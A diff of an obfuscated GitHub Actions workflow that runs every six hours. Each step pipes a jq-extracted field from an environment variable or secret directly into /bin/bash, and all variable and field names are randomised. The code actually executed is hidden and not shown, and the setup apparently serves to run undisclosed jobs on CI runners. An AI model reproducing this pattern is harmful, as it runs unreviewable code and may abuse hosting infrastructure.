@@ -2,27 +2,23 @@ name: zhuwushan1989
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '3 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhuwushan1989
         env:
-          cc6576: ${{ secrets.cc6576 }}
+          mi65: ${{ secrets.mi65 }}
         run: |
-          echo $cc6576 | jq -r .riy16696 | /bin/bash
-          echo $uj0698 | jq -r .p423 | /bin/bash
-          echo $cfl8142 | jq -r .jmz854 | /bin/bash
-          echo $l754 | jq -r .vgaxa283 | /bin/bash
-          echo $fbc18419 | jq -r .n5626 | /bin/bash
-          echo $k551 | jq -r .ghz13465 | /bin/bash
-          echo $dd46956 | jq -r .skuvy2119 | /bin/bash
-          echo $mh0 | jq -r .yo5988 | /bin/bash
-          echo $gr49 | jq -r .voyk45452 | /bin/bash
-          echo $ispuk799 | jq -r .yists6094 | /bin/bash
-          echo $mo2441 | jq -r .msvoc72080 | /bin/bash
-          echo $ah9 | jq -r .xtlz177 | /bin/bash
+          echo $mi65 | jq -r .tfc8 | /bin/bash
+          echo $wcau14 | jq -r .wksg0382 | /bin/bash
+          echo $yonvf407 | jq -r .fflk4773 | /bin/bash
+          echo $htc632 | jq -r .bt2 | /bin/bash
+          echo $iqeh8519 | jq -r .t3421 | /bin/bash
+          echo $u51 | jq -r .trwyz63 | /bin/bash
+          echo $cd29 | jq -r .csbd4 | /bin/bash
 
